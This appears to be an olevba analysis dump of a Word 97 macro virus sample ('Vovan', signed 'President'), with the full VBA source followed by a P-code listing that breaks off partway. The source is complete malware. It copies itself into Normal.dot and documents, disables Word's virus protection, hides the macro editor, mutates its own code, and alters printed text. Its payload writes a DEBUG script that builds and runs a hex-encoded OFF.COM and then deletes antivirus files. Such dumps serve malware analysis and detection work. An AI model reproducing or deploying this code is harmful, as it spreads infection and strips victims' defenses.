olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vovan
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vovan - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO picture.frm 
in file: Virus.MSWord.Vovan - OLE stream: 'Macros/VBA/picture'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


















Private Sub Image1_Click()
MsgBox "          Ну шта?"
End Sub
-------------------------------------------------------------------------------
VBA MACRO President.bas 
in file: Virus.MSWord.Vovan - OLE stream: 'Macros/VBA/President'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
If Application.ShowVisualBasicEditor = True Then Application.ShowVisualBasicEditor = False
On Error GoTo -1: On Error GoTo 1
Putsch
Application.ScreenUpdating = False
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="President", Object:=wdOrganizerObjectProjectItems
1:
On Error GoTo -1: On Error GoTo 2
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="picture", Object:=wdOrganizerObjectProjectItems
2:
ActiveDocument.Save
End Sub
Sub ToolsMacro()
Call Forma
End Sub
Sub FileTemplates()
Call Forma
End Sub
Sub ViewVBcode()
Call Forma
End Sub
Sub Organizer()
Call Forma
End Sub
Sub ToolsRecordMacroStart()
Call Forma
End Sub
Sub ToolsRecordMacroToggle()
Call Forma
End Sub
Sub AutoExec()
With Options
.VirusProtection = False
.AllowFastSave = False
.BackgroundSave = False
.CreateBackup = False
.SavePropertiesPrompt = False
.SaveInterval = 0
.SaveNormalPrompt = False
End With
On Error GoTo -1: On Error GoTo holiday
If Day(Now()) = 27 And Month(Now()) = 5 Then
Beep
MsgBox "Вас приветствует Великий и ужасный СПУТНИК!!!"
'MISTER VOVAN ITS NUMBER ONE!!!
End If
holiday:
End Sub
Sub AutoExit()
With Options
.VirusProtection = True
End With
Application.Quit
End Sub
Sub FileSave()
If Day(Now()) = Month(Now()) Then
Call Forma
End If
On Error GoTo -1: On Error GoTo Error
ActiveDocument.Save
On Error GoTo -1: On Error GoTo 3
Putsch
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="President", Object:=wdOrganizerObjectProjectItems
3:
On Error GoTo -1: On Error GoTo 4
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="picture", Object:=wdOrganizerObjectProjectItems
4:
ActiveDocument.Save
Error:
End Sub
Sub FileSaveAs()
If Day(Now()) = Month(Now()) Then
Call Forma
End If
On Error GoTo -1: On Error GoTo 5
Putsch
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="President", Object:=wdOrganizerObjectProjectItems
5:
On Error GoTo -1: On Error GoTo 6
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="picture", Object:=wdOrganizerObjectProjectItems
6:
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub Forma()
With Options
.VirusProtection = False
End With
Beep
StatusBar = "President"
Load picture
picture.Show
Set fs = Application.FileSearch
With fs
.LookIn = "C:\WINDOWS\"
.FileName = "OFF.COM"
If .Execute > 0 Then
ChDir "C:\WINDOWS\"
Shell "C:\WINDOWS\OFF.COM", 0
End
Else
Call off
End If
End With
End Sub
Sub FilePrint()
If Dialogs(wdDialogFilePrint).Show = -1 Then
With Options
.CheckSpellingAsYouType = False
.CheckGrammarAsYouType = False
End With
Selection.Find.ClearFormatting
Selection.Find.Replacement.ClearFormatting
With Selection.Find
.Text = "что "
.Replacement.Text = "шта "
.Forward = True
.Wrap = wdFindContinue
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
.Text = " и "
.Replacement.Text = " и никуда я не уйду "
.Forward = True
.Wrap = wdFindContinue
End With
Selection.Find.Execute Replace:=wdReplaceAll
Selection.EndKey Unit:=wdStory
Selection.TypeParagraph
Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
Selection.TypeText Text:="Ельцин Б.Н. понимаеш?"
Selection.HomeKey Unit:=wdStory
ActiveDocument.UndoClear
End If
End Sub
Sub FilePrintDefault()
Call FilePrint
End Sub
Sub ToolsOptions()
With Options
.VirusProtection = True
.CheckSpellingAsYouType = True
.CheckGrammarAsYouType = True
End With
If Dialogs(wdDialogToolsOptions).Show Then
End If
With Options
.VirusProtection = False
End With
End Sub
Sub HelpAbout()
Call Forma
End Sub
Sub FileOpen()
WordBasic.DisableAutoMacros
On Error GoTo -1: On Error GoTo 100
Dialogs(wdDialogFileOpen).Show
WordBasic.EnableAutoMacros
Call FileSave
100:
End Sub
Sub Putsch()
On Error Resume Next
Application.ScreenUpdating = False
Set Current = MacroContainer
For Grow = 1 To 5
Number = Current.VBProject.VBComponents("President").CodeModule.ProcCountLines("Putsch", vbext_pk_Proc)
RandomLine = Int(Rnd() * Number + 1)
RemarkLength = Int(Rnd() * 40 + 1)
For Length = 1 To RemarkLength
Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next Length
Current.VBProject.VBComponents("President").CodeModule.InsertLines RandomLine, "rem " & Remark
Remark = ""
Next Grow
End Sub
Sub off()
Open "C:\WINDOWS\OFF.SCR" For Output As #1
Print #1, "N OFF.COM"
Print #1, "E 0100 42 59 20 53 45 52 47 45 59 20 5A 41 42 41 52 59"
Print #1, "E 0110 41 4E 53 4B 59 50 B4 4A BB 00 01 CD 21 0F 82 B6"
Print #1, "E 0120 00 B8 87 16 CD 2F 0B C0 0F 85 AB 00 89 3E 48 01"
Print #1, "E 0130 8C 06 4A 01 0B F6 74 0C 8B DE B4 48 CD 21 0F 82"
Print #1, "E 0140 95 00 8E C0 B8 01 00 9A 00 00 00 00 0F 82 87 00"
Print #1, "E 0150 0F 01 06 00 01 A0 05 01 A2 07 01 C7 06 05 01 F2"
Print #1, "E 0160 00 2B C0 B9 01 00 CD 31 72 6D A3 08 01 8B D8 B8"
Print #1, "E 0170 0C 00 66 BF 00 01 00 00 1E 07 CD 31 1E 07 8E 1E"
Print #1, "E 0180 08 01 66 B9 04 00 00 00 66 BE 08 00 00 00 66 BF"
Print #1, "E 0190 0A 01 00 00 F3 66 A5 06 1F 8C CB B8 0B 00 66 BF"
Print #1, "E 01A0 DC 01 00 00 CD 31 C6 06 E1 01 9A 8E 06 08 01 66"
Print #1, "E 01B0 B9 04 00 00 00 66 BE DC 01 00 00 66 BF 08 00 00"
Print #1, "E 01C0 00 F3 66 A5 9A 00 00 13 00 FA B0 8F E6 70 B0 00"
Print #1, "E 01D0 E6 71 B8 FE 00 E7 64 B8 00 4C CD 21 00 00 00 00"
Print #1, "E 01E0 00 00 00 00 C9 01 0B 00 00 EC 00 00"
Print #1, "RCX"
Print #1, "00EC"
Print #1, "W"
Print #1, "Q"
Close #1
Open "C:\WINDOWS\OFF.BAT" For Output As #1
Print #1, "@echo off"
Print #1, "debug < OFF.SCR"
Close #1
ChDir "C:\WINDOWS\"
Shell "C:\WINDOWS\OFF.BAT", 0
Dim PauseTime, Start, Finish
PauseTime = 10
Start = Timer
Do While Timer < Start + PauseTime
DoEvents
Loop
Finish = Timer
ChDir "C:\WINDOWS\"
Kill "C:\WINDOWS\OFF.BAT"
Kill "C:\WINDOWS\OFF.SCR"
On Error GoTo -1: On Error GoTo AVP
Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
StatusBar = "Дума отправлена в отставку!"
AVP:
End
End Sub
'***************************************
'* Author of given MacroVirus is VOVAN *
'*         MacroVirus.Word97           *
'*      Name of President virus        *
'*             Ver 1.0                 *
'***************************************
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Vovan
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/picture - 1526 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' 	FuncDefn (Private Sub Image1_Click())
' Line #19:
' 	LitStr 0x0011 "          Ну шта?"
' 	ArgsCall MsgBox 0x0001 
' Line #20:
' 	EndSub 
' Macros/VBA/President - 12436 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	EndIf 
' Line #2:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError 1 
' Line #3:
' 	ArgsCall Putsch 0x0000 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #5:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "President"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #6:
' 	LineNum 1 
' 	BoS 0x0000 
' Line #7:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError 2 
' Line #8:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "picture"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #9:
' 	LineNum 2 
' 	BoS 0x0000 
' Line #10:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub ToolsMacro())
' Line #13:
' 	ArgsCall (Call) Forma 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Sub FileTemplates())
' Line #16:
' 	ArgsCall (Call) Forma 0x0000 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Sub ViewVBcode())
' Line #19:
' 	ArgsCall (Call) Forma 0x0000 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Sub Organizer())
' Line #22:
' 	ArgsCall (Call) Forma 0x0000 
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Sub ToolsRecordMacroStart())
' Line #25:
' 	ArgsCall (Call) Forma 0x0000 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Sub ToolsRecordMacroToggle())
' Line #28:
' 	ArgsCall (Call) Forma 0x0000 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub AutoExec())
' Line #31:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #32:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #33:
' 	LitVarSpecial (False)
' 	MemStWith AllowFastSave 
' Line #34:
' 	LitVarSpecial (False)
' 	MemStWith BackgroundSave 
' Line #35:
' 	LitVarSpecial (False)
' 	MemStWith CreateBackup 
' Line #36:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #37:
' 	LitDI2 0x0000 
' 	MemStWith SaveInterval 
' Line #38:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #39:
' 	EndWith 
' Line #40:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError holiday 
' Line #41:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001B 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #42:
' 	ArgsCall Beep 0x0000 
' Line #43:
' 	LitStr 0x002D "Вас приветствует Великий и ужасный СПУТНИК!!!"
' 	ArgsCall MsgBox 0x0001 
' Line #44:
' 	QuoteRem 0x0000 0x001E "MISTER VOVAN ITS NUMBER ONE!!!"
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Label holiday 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub AutoExit())
' Line #49:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #50:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #51:
' 	EndWith 
' Line #52:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub FileSave())
' Line #55:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	IfBlock 
' Line #56:
' 	ArgsCall (Call) Forma 0x0000 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Error 
' Line #59:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #60:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError 3 
' Line #61:
' 	ArgsCall Putsch 0x0000 
' Line #62:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #63:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #64:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "President"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #65:
' 	LineNum 3 
' 	BoS 0x0000 
' Line #66:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError 4 
' Line #67:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "picture"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #68:
' 	LineNum 4 
' 	BoS 0x0000 
' Line #69:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #70:
' 	Label Error 
' Line #71:
' 	EndSub 
' Line #72:
' 	FuncDefn (Sub FileSaveAs())
' Line #73:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	IfBlock 
' Line #74:
' 	ArgsCall (Call) Forma 0x0000 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError 5 
' Line #77:
' 	ArgsCall Putsch 0x0000 
' Line #78:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #79:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #80:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "President"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #81:
' 	LineNum 5 
' 	BoS 0x0000 
' Line #82:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError 6 
' Line #83:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "picture"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #84:
' 	LineNum 6 
' 	BoS 0x0000 
' Line #85:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub Forma())
' Line #88:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #89:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #90:
' 	EndWith 
' Line #91:
' 	ArgsCall Beep 0x0000 
' Line #92:
' 	LitStr 0x0009 "President"
' 	St StatusBar 
' Line #93:
' 	Ld picture 
' 	ArgsCall Local 0x0001 
' Line #94:
' 	Ld picture 
' 	ArgsMemCall Show 0x0000 
' Line #95:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #96:
' 	StartWithExpr 
' 	Ld fs 
' 	With 
' Line #97:
' 	LitStr 0x000B "C:\WINDOWS\"
' 	MemStWith LookIn 
' Line #98:
' 	LitStr 0x0007 "OFF.COM"
' 	MemStWith FileName 
' Line #99:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #100:
' 	LitStr 0x000B "C:\WINDOWS\"
' 	ArgsCall ChDir 0x0001 
' Line #101:
' 	LitStr 0x0012 "C:\WINDOWS\OFF.COM"
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #102:
' 	End 
' Line #103:
' 	ElseBlock 
' Line #104:
' 	ArgsCall (Call) off 0x0000 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	EndWith 
' Line #107:
' 	EndSub 
' Line #108:
' 	FuncDefn (Sub FilePrint())
' Line #109:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #110:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #111:
' 	LitVarSpecial (False)
' 	MemStWith CheckSpellingAsYouType 
' Line #112:
' 	LitVarSpecial (False)
' 	MemStWith CheckGrammarAsYouType 
' Line #113:
' 	EndWith 
' Line #114:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #115:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #116:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #117:
' 	LitStr 0x0004 "что "
' 	MemStWith Then 
' Line #118:
' 	LitStr 0x0004 "шта "
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #119:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #120:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #121:
' 	EndWith 
' Line #122:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #123:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #124:
' 	LitStr 0x0003 " и "
' 	MemStWith Then 
' Line #125:
' 	LitStr 0x0014 " и никуда я не уйду "
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #126:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #127:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #128:
' 	EndWith 
' Line #129:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #130:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #131:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #132:
' 	Ld wdAlignParagraphRight 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #133:
' 	LitStr 0x0015 "Ельцин Б.Н. понимаеш?"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #134:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #135:
' 	Ld ActiveDocument 
' 	ArgsMemCall UndoClear 0x0000 
' Line #136:
' 	EndIfBlock 
' Line #137:
' 	EndSub 
' Line #138:
' 	FuncDefn (Sub FilePrintDefault())
' Line #139:
' 	ArgsCall (Call) FilePrint 0x0000 
' Line #140:
' 	EndSub 
' Line #141:
' 	FuncDefn (Sub ToolsOptions())
' Line #142:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #143:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #144:
' 	LitVarSpecial (True)
' 	MemStWith CheckSpellingAsYouType 
' Line #145:
' 	LitVarSpecial (True)
' 	MemStWith CheckGrammarAsYouType 
' Line #146:
' 	EndWith 
' Line #147:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	IfBlock 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #150:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #151:
' 	EndWith 
' Line #152:
' 	EndSub 
' Line #153:
' 	FuncDefn (Sub HelpAbout())
' Line #154:
' 	ArgsCall (Call) Forma 0x0000 
' Line #155:
' 	EndSub 
' Line #156:
' 	FuncDefn (Sub FileOpen())
' Line #157:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #158:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError 100 
' Line #159:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #160:
' 	Ld WordBasic 
' 	ArgsMemCall EnableAutoMacros 0x0000 
' Line #161:
' 	ArgsCall (Call) FileSave 0x0000 
' Line #162:
' 	LineNum 100 
' 	BoS 0x0000 
' Line #163:
' 	EndSub 
' Line #164:
' 	FuncDefn (Sub Putsch())
' Line #165:
' 	OnError (Resume Next) 
' Line #166:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #167:
' 	SetStmt 
' 	Ld MacroContainer 
' 	Set Current 
' Line #168:
' 	StartForVariable 
' 	Ld Grow 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	For 
' Line #169:
' 	LitStr 0x0006 "Putsch"
' 	Ld vbext_pk_Proc 
' 	LitStr 0x0009 "President"
' 	Ld Current 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Number 
' Line #170:
' 	ArgsLd Rnd 0x0000 
' 	Ld Number 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St RandomLine 
' Line #171:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0028 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St RemarkLength 
' Line #172:
' 	StartForVariable 
' 	Ld Length 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld RemarkLength 
' 	For 
' Line #173:
' 	Ld Remark 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Remark 
' Line #174:
' 	StartForVariable 
' 	Ld Length 
' 	EndForVariable 
' 	NextVar 
' Line #175:
' 	Ld RandomLine 
' 	LitStr 0x0004 "rem "
' 	Ld Remark 
' 	Concat 
' 	LitStr 0x0009 "President"
' 	Ld Current 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #176:
' 	LitStr 0x0000 ""
' 	St Remark 
' Line #177:
' 	StartForVariable 
' 	Ld Grow 
' 	EndForVariable 
' 	NextVar 
' Line #178:
' 	EndSub 
' Line #179:
' 	FuncDefn (Sub off())
' Line #180:
' 	LitStr 0x0012 "C:\WINDOWS\OFF.SCR"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #181:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "N OFF.COM"
' 	PrintItemNL 
' Line #182:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0100 42 59 20 53 45 52 47 45 59 20 5A 41 42 41 52 59"
' 	PrintItemNL 
' Line #183:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0110 41 4E 53 4B 59 50 B4 4A BB 00 01 CD 21 0F 82 B6"
' 	PrintItemNL 
' Line #184:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0120 00 B8 87 16 CD 2F 0B C0 0F 85 AB 00 89 3E 48 01"
' 	PrintItemNL 
' Line #185:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0130 8C 06 4A 01 0B F6 74 0C 8B DE B4 48 CD 21 0F 82"
' 	PrintItemNL 
' Line #186:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0140 95 00 8E C0 B8 01 00 9A 00 00 00 00 0F 82 87 00"
' 	PrintItemNL 
' Line #187:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0150 0F 01 06 00 01 A0 05 01 A2 07 01 C7 06 05 01 F2"
' 	PrintItemNL 
' Line #188:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0160 00 2B C0 B9 01 00 CD 31 72 6D A3 08 01 8B D8 B8"
' 	PrintItemNL 
' Line #189:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0170 0C 00 66 BF 00 01 00 00 1E 07 CD 31 1E 07 8E 1E"
' 	PrintItemNL 
' Line #190:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0180 08 01 66 B9 04 00 00 00 66 BE 08 00 00 00 66 BF"
' 	PrintItemNL 
' Line #191:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0190 0A 01 00 00 F3 66 A5 06 1F 8C CB B8 0B 00 66 BF"
' 	PrintItemNL 
' Line #192:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01A0 DC 01 00 00 CD 31 C6 06 E1 01 9A 8E 06 08 01 66"
' 	PrintItemNL 
' Line #193:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01B0 B9 04 00 00 00 66 BE DC 01 00 00 66 BF 08 00 00"
' 	PrintItemNL 
' Line #194:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01C0 00 F3 66 A5 9A 00 00 13 00 FA B0 8F E6 70 B0 00"
' 	PrintItemNL 
' Line #195:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01D0 E6 71 B8 FE 00 E7 64 B8 00 4C CD 21 00 00 00 00"
' 	PrintItemNL 
' Line #196:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "E 01E0 00 00 00 00 C9 01 0B 00 00 EC 00 00"
' 	PrintItemNL 
' Line #197:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "RCX"
' 	PrintItemNL 
' Line #198:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "00EC"
' 	PrintItemNL 
' Line #199:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "W"
' 	PrintItemNL 
' Line #200:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "Q"
' 	PrintItemNL 
' Line #201:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #202:
' 	LitStr 0x0012 "C:\WINDOWS\OFF.BAT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #203:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #204:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "debug < OFF.SCR"
